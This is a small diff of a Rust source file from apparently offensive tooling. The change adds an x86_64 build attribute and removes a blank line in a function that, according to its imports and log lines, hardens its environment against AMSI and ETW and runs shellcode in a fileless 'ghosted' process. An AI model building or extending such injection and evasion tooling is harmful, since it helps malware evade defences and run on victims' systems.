@@ -5,6 +5,7 @@ use crate::debug;
 use crate::core::{amsi, etw, spoof, nt, types::*};
 use core::ffi::c_void;
 
+#[cfg(target_arch = "x86_64")]
 pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
     debug!("[INJECTION] Environment hardening");
     
@@ -64,7 +65,6 @@ pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
     debug!("[=] Pipeline complete: shellcode running in file less process (PID {})", state.process_id);
     true
 }}
-
 
 /**
  * Check if a process is till alive by doing a zero timeout wait on its handle
